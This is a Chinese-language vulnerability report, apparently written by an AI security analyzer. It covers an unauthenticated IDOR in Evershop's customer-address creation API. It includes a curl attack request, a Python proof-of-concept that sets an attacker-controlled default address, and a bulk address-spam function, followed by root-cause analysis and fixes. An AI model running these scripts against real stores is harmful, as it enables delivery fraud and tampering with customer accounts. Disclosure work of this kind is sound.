# Evershop createCustomerAddress 未授权为任意用户创建地址漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：不安全的直接对象引用 (IDOR, CWE-639) + 业务逻辑漏洞
- **漏洞名称**：Evershop createCustomerAddress API 未授权为任意客户创建地址漏洞
- **风险等级**：中危
- **概述**：`POST /customers/:customer_id/addresses` API 端点配置为公开访问（`access="public"`），无需身份认证即可为任意客户创建收货地址。攻击者可为他人账户添加恶意地址，可能被设为默认地址，影响后续订单配送。

### 2.2 利用前提与特征

- **利用难度**：中
- **权限要求**：无需认证
- **操作条件**：
  1. 获取目标客户的UUID（customer_id）
- **攻击特征**：发送POST请求到公开的地址创建接口

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **地址注入**：为他人账户添加攻击者控制的地址
2. **默认地址劫持**：如设置is_default=true，可成为默认配送地址
3. **配送欺诈**：受害者可能在不知情情况下使用恶意地址下单
4. **资源消耗**：批量创建垃圾地址污染用户账户

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：确认路由配置**

文件：`packages/evershop/src/modules/customer/api/createCustomerAddress/route.json`
```json
{
  "methods": ["POST"],
  "path": "/customers/:customer_id/addresses",
  "access": "public"  // <-- 无需认证！
}
```

**步骤2：分析Handler逻辑**

文件：`packages/evershop/src/modules/customer/api/createCustomerAddress/[bodyParser]createCustomerAddress.js`
```javascript
export default async (request, response, next) => {
  try {
    // 直接使用URL参数和请求体创建地址
    const address = await createCustomerAddress(
      request.params.customer_id,  // 用户可控
      request.body                  // 用户可控
    );
    // ...
  }
};
```

**步骤3：追踪服务层实现**

文件：`packages/evershop/src/modules/customer/services/customer/address/createCustomerAddress.ts`
```typescript
async function createCustomerAddress(
  customerUUID: string,
  address: Address,
  context: Record<string, unknown>
): Promise<Address> {
  // ...
  const customer = await select()
    .from('customer')
    .where('uuid', '=', customerUUID)  // 仅验证存在性
    .load(pool);

  if (!customer) {
    throw new Error('Invalid customer');
  }

  // 直接为该客户创建地址 - 未验证请求者身份！
  customerAddressData.customer_id = customer.customer_id;
  const customerAddress = await hookable(insertCustomerAddressData, ...);
  // ...
}
```

**步骤4：发送攻击请求**

```bash
# 为任意客户创建地址
curl -X POST 'https://target.com/api/customers/victim-customer-uuid/addresses' \
  -H 'Content-Type: application/json' \
  -d '{
    "full_name": "Attacker Name",
    "address_1": "456 Attacker Street",
    "city": "Attacker City",
    "country_id": 1,
    "province_id": 1,
    "postcode": "99999",
    "telephone": "555-EVIL",
    "is_default": true
  }'
```

**预期响应**（创建成功）：
```json
{
  "data": {
    "uuid": "new-address-uuid",
    "full_name": "Attacker Name",
    "address_1": "456 Attacker Street",
    "is_default": true
  }
}
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop IDOR PoC - Create Address for Any Customer
"""

import requests
import json

class AddressInjector:
    def __init__(self, target_url):
        self.target_url = target_url

    def inject_address(self, customer_id, address_data):
        """
        为指定客户注入地址
        """
        endpoint = f"{self.target_url}/api/customers/{customer_id}/addresses"

        print(f"[*] 目标端点: {endpoint}")
        print(f"[*] 注入地址: {json.dumps(address_data, indent=2)}")

        response = requests.post(endpoint, json=address_data)

        if response.status_code == 200:
            data = response.json().get('data', {})
            print("[+] 地址注入成功!")
            print(f"    新地址UUID: {data.get('uuid')}")
            print(f"    是否默认: {data.get('is_default')}")
            return data
        else:
            print(f"[-] 注入失败: {response.status_code}")
            print(f"    响应: {response.text}")
            return None

    def set_default_address_attack(self, customer_id):
        """
        设置恶意默认地址攻击
        """
        attacker_address = {
            "full_name": "Victim Name",  # 伪装成受害者
            "address_1": "456 Attacker Controlled Address",
            "city": "Attacker City",
            "country_id": 1,
            "province_id": 1,
            "postcode": "99999",
            "telephone": "555-0000",
            "is_default": True  # 设为默认地址！
        }

        print("[!] 执行默认地址劫持攻击...")
        return self.inject_address(customer_id, attacker_address)


def main():
    target = "https://shop.example.com"
    victim_customer_id = "victim-customer-uuid"

    injector = AddressInjector(target)
    injector.set_default_address_attack(victim_customer_id)

    print("\n[!] 攻击完成!")
    print("[!] 受害者下次下单时将默认使用攻击者地址")


if __name__ == "__main__":
    main()
```

### 4.2 批量地址污染攻击

```python
def spam_addresses(injector, customer_id, count=100):
    """
    批量创建垃圾地址污染用户账户
    """
    for i in range(count):
        spam_address = {
            "full_name": f"Spam Address {i}",
            "address_1": f"{i} Spam Street",
            "city": "Spam City",
            "country_id": 1,
            "province_id": 1,
            "postcode": str(10000 + i),
            "telephone": f"555-{i:04d}"
        }
        injector.inject_address(customer_id, spam_address)

    print(f"[*] 已为客户 {customer_id} 创建 {count} 个垃圾地址")
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              地址创建IDOR数据流                                  │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  HTTP请求: POST /customers/:customer_id/addresses              │
│  Body: { "full_name": "...", "is_default": true, ... }        │
│  路由配置: access="public"  ← 无需认证                          │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ createCustomerAddress.js Handler        │                  │
│  │                                         │                  │
│  │ createCustomerAddress(                  │                  │
│  │   request.params.customer_id, ← 攻击者控制│                  │
│  │   request.body               ← 攻击者控制│                  │
│  │ )                                       │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ createCustomerAddress.ts 服务           │                  │
│  │                                         │                  │
│  │ 1. 验证customerUUID存在 ✓               │                  │
│  │ 2. 验证请求者身份 ✗ (缺失!)              │                  │
│  │ 3. 设置customer_id关联                  │                  │
│  │ 4. 插入地址记录                          │                  │
│  │ 5. 如果is_default=true，更新其他地址     │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 结果：                                   │                  │
│  │ - 攻击者地址被添加到受害者账户            │                  │
│  │ - 如设置is_default=true，成为默认地址     │                  │
│  │ - 受害者下次下单可能使用该地址            │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **路由公开访问**：`access="public"` 允许未认证请求
2. **信任URL参数**：直接使用 `request.params.customer_id` 确定地址归属
3. **缺失身份验证**：未验证请求者是否为指定客户

## 6. 修复建议

### 6.1 方案A：修改路由为私有

```json
// route.json
{
  "methods": ["POST"],
  "path": "/customers/:customer_id/addresses",
  "access": "private"
}
```

### 6.2 方案B：在Handler中验证身份

```javascript
// createCustomerAddress.js
export default async (request, response, next) => {
  try {
    // 1. 获取当前登录用户
    const currentCustomer = request.getCurrentCustomer();
    if (!currentCustomer) {
      response.status(UNAUTHORIZED);
      return response.json({
        error: { message: 'Authentication required' }
      });
    }

    // 2. 验证操作权限 - 只能为自己创建地址
    if (currentCustomer.uuid !== request.params.customer_id) {
      response.status(FORBIDDEN);
      return response.json({
        error: { message: 'You can only create addresses for your own account' }
      });
    }

    // 3. 使用会话中的customer_id而非URL参数
    const address = await createCustomerAddress(
      currentCustomer.uuid,  // 使用会话中的值
      request.body
    );
    // ...
  }
};
```

### 6.3 速率限制

```javascript
// 防止地址污染攻击
const rateLimit = require('express-rate-limit');

const addressCreateLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1小时
  max: 10, // 每小时最多创建10个地址
  message: 'Too many addresses created, please try again later'
});

app.use('/api/customers/*/addresses', addressCreateLimiter);
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
